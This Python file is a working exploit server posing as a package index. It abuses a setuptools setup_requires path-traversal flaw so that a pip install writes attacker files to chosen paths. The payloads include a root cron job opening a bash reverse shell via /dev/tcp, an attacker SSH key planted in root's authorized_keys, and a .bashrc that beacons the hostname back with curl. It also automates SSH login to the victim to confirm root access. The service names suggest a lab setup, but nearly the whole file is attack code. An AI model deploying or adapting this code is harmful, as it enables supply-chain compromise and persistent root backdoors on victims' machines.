#!/usr/bin/env python3
"""
Malicious Package Index Server

Serves a Python package that, when pip installed, triggers the
setuptools path traversal vulnerability via setup_requires.

Flow:
1. Victim runs: pip install malicious-package --index-url http://server:8080/simple/
2. pip downloads malicious-package-1.0.tar.gz from our server
3. pip runs setup.py which has setup_requires=["triggerpkg"]
4. setuptools' PackageIndex fetches "triggerpkg" from our server
5. Our server returns a URL with path traversal payload
6. PackageIndex._download_url() writes file to attacker-controlled path
"""

import http.server
import io
import os
import socketserver
import subprocess
import sys
import tarfile
from urllib.parse import quote, unquote

PORT = 8080
SSH_KEY_DIR = "/root/.ssh"
SSH_PRIVATE_KEY = f"{SSH_KEY_DIR}/attacker_key"
SSH_PUBLIC_KEY = f"{SSH_KEY_DIR}/attacker_key.pub"
PACKAGE_DIR = "/app/packages"

ATTACKER_PUBLIC_KEY = ""
ACTIVE_SCENARIO = "cron"
BEACONS_RECEIVED = []


def get_scenarios():
    """Return attack scenarios with payloads."""
    return {
        "cron": {
            "target": "/etc/cron.d/backdoor",
            "payload": b"""# Malicious cron job - reverse shell every minute
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/server/4444 0>&1'
""",
        },
        "ssh": {
            "target": "/root/.ssh/authorized_keys",
            "payload": f"""# Attacker's SSH key for persistent access
{ATTACKER_PUBLIC_KEY}
""".encode(),
        },
        "bashrc": {
            "target": "/home/victim/.bashrc",
            "payload": b"""# Backdoored .bashrc
curl -s http://server:8080/beacon?h=$(hostname) &>/dev/null &
echo "[BACKDOOR] Beacon sent to attacker"
""",
        },
    }


def generate_ssh_keypair():
    """Generate SSH keypair for the attacker."""
    global ATTACKER_PUBLIC_KEY
    os.makedirs(SSH_KEY_DIR, exist_ok=True)

    if not os.path.exists(SSH_PRIVATE_KEY):
        print("[SERVER] Generating SSH keypair...")
        subprocess.run([
            "ssh-keygen", "-t", "ed25519", "-f", SSH_PRIVATE_KEY,
            "-N", "", "-C", "attacker@malicious-pypi"
        ], check=True, capture_output=True)

    with open(SSH_PUBLIC_KEY, 'r') as f:
        ATTACKER_PUBLIC_KEY = f.read().strip()
    print(f"[SERVER] SSH key: {ATTACKER_PUBLIC_KEY[:50]}...")


def build_malicious_package():
    """Build the malicious package tarball."""
    os.makedirs(PACKAGE_DIR, exist_ok=True)
    tarball = os.path.join(PACKAGE_DIR, "malicious-package-1.0.tar.gz")

    setup_py = '''
from setuptools import setup
setup(
    name="malicious-package",
    version="1.0",
    py_modules=["malicious"],
    setup_requires=["triggerpkg"],
    dependency_links=["http://server:8080/deps/"],
)
'''

    with tarfile.open(tarball, "w:gz") as tar:
        for name, content in [
            ("malicious-package-1.0/setup.py", setup_py),
            ("malicious-package-1.0/malicious.py", "# malicious\n"),
            ("malicious-package-1.0/PKG-INFO", "Metadata-Version: 1.0\nName: malicious-package\nVersion: 1.0\n"),
        ]:
            data = content.encode()
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))

    print(f"[SERVER] Built package: {tarball}")


class MaliciousHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[SERVER] {args[0]}")

    def do_GET(self):
        path = self.path.split('#')[0]
        query = ""
        if '?' in path:
            path, query = path.split('?', 1)

        print(f"[DEBUG] Request: {path}")

        if path in ('/', '/simple/', '/simple'):
            self.serve_index()
        elif path == '/simple/malicious-package/' or path == '/simple/malicious-package':
            self.serve_package_page()
        elif path.endswith('malicious-package-1.0.tar.gz'):
            self.serve_tarball()
        elif '/simple/triggerpkg' in path or '/deps/' in path:
            self.serve_trigger_package()
        elif '/scenario/' in path:
            self.set_scenario(path)
        elif '/status' in path:
            self.serve_status()
        elif '/beacon' in path:
            self.handle_beacon(query)
        elif '/validate/ssh' in path:
            self.validate_ssh()
        else:
            # This is the path traversal payload delivery
            self.serve_payload()

    def serve_index(self):
        """PyPI simple index."""
        html = '''<!DOCTYPE html>
<html><body>
<a href="/simple/malicious-package/">malicious-package</a>
</body></html>'''
        self.send_html(html)

    def serve_package_page(self):
        """Package download links."""
        html = '''<!DOCTYPE html>
<html><body>
<a href="/packages/malicious-package-1.0.tar.gz#md5=abc123">malicious-package-1.0.tar.gz</a>
</body></html>'''
        self.send_html(html)
        print("[SERVER] Served package page")

    def serve_tarball(self):
        """Serve the actual package tarball."""
        tarball = os.path.join(PACKAGE_DIR, "malicious-package-1.0.tar.gz")
        if os.path.exists(tarball):
            with open(tarball, 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'application/gzip')
            self.send_header('Content-Length', len(data))
            self.end_headers()
            self.wfile.write(data)
            print(f"[SERVER] Served tarball ({len(data)} bytes)")
        else:
            self.send_error(404)

    def serve_trigger_package(self):
        """
        When setuptools' PackageIndex looks for 'triggerpkg', we return
        a page with a link containing the path traversal payload.
        """
        scenario = get_scenarios()[ACTIVE_SCENARIO]
        target = scenario["target"]
        # URL-encode the target path - this becomes the "filename"
        encoded = quote(target, safe='')

        html = f'''<!DOCTYPE html>
<html><body>
<a href="/{encoded}#egg=triggerpkg-1.0">triggerpkg-1.0.tar.gz</a>
</body></html>'''

        self.send_html(html)
        print(f"[SERVER] Served trigger with path traversal -> {target}")

    def serve_payload(self):
        """Serve the malicious payload when the traversal URL is requested."""
        decoded = unquote(self.path.lstrip('/'))
        scenario = get_scenarios()[ACTIVE_SCENARIO]
        payload = scenario["payload"]

        print(f"[SERVER] *** PATH TRAVERSAL TRIGGERED ***")
        print(f"[SERVER] Decoded path: {decoded}")
        print(f"[SERVER] Sending payload ({len(payload)} bytes)")

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(payload))
        self.end_headers()
        self.wfile.write(payload)

    def set_scenario(self, path):
        global ACTIVE_SCENARIO
        name = path.split('/')[-1]
        if name in get_scenarios():
            ACTIVE_SCENARIO = name
            self.send_html(f"Scenario: {name}")
            print(f"[SERVER] Scenario: {name}")
        else:
            self.send_error(404)

    def serve_status(self):
        scenario = get_scenarios()[ACTIVE_SCENARIO]
        html = f'''<!DOCTYPE html>
<html><body>
<h1>Malicious Server</h1>
<p>Scenario: {ACTIVE_SCENARIO}</p>
<p>Target: {scenario["target"]}</p>
<p>Beacons: {len(BEACONS_RECEIVED)}</p>
<ul>{"".join(f"<li>{b}</li>" for b in BEACONS_RECEIVED)}</ul>
</body></html>'''
        self.send_html(html)

    def handle_beacon(self, query):
        from urllib.parse import parse_qs
        import time
        params = parse_qs(query)
        host = params.get('h', ['unknown'])[0]
        BEACONS_RECEIVED.append(f"{time.strftime('%H:%M:%S')} - {host}")
        print(f"[BEACON] {host}")
        self.send_response(200)
        self.end_headers()

    def validate_ssh(self):
        print("[SERVER] Validating SSH access to victim...")
        try:
            result = subprocess.run([
                "ssh", "-i", SSH_PRIVATE_KEY,
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=5",
                "root@client",
                "echo SSH_OK; id; hostname"
            ], capture_output=True, text=True, timeout=10)

            if "SSH_OK" in result.stdout:
                print(f"[SSH SUCCESS]\n{result.stdout}")
                self.send_html(f"<h1>SSH ACCESS CONFIRMED</h1><pre>{result.stdout}</pre>")
            else:
                print(f"[SSH FAILED] {result.stderr}")
                self.send_html(f"<h1>SSH Failed</h1><pre>{result.stderr}</pre>", 500)
        except Exception as e:
            print(f"[SSH ERROR] {e}")
            self.send_html(f"<h1>Error</h1><pre>{e}</pre>", 500)

    def send_html(self, content, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode())


def main():
    generate_ssh_keypair()
    build_malicious_package()

    print("=" * 60)
    print("MALICIOUS PACKAGE INDEX SERVER")
    print("=" * 60)
    print(f"Listening on port {PORT}")
    print()
    print("To trigger the attack, victim runs:")
    print(f"  pip install malicious-package --index-url http://server:{PORT}/simple/ --trusted-host server")
    print()
    print("=" * 60)

    with socketserver.TCPServer(("0.0.0.0", PORT), MaliciousHandler) as httpd:
        httpd.serve_forever()


if __name__ == "__main__":
    main()
